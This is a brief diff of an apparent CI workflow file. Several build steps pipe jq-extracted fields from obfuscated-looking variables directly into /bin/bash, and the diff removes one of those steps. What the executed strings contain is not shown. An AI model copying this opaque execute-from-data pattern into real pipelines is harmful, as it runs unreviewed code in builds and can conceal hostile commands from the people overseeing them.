@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$se22" | jq -r .n4 | /bin/bash
           printf '%s' "$d01597" | jq -r .tvkvg207 | /bin/bash
           echo $y2 | jq -r .twjau3 | /bin/bash
-          printf '%s' "$efi0" | jq -r .b9 | /bin/bash
           printf '%s' "$bdc39" | jq -r .wibl6048 | /bin/bash
 
       - name: Upload artifact
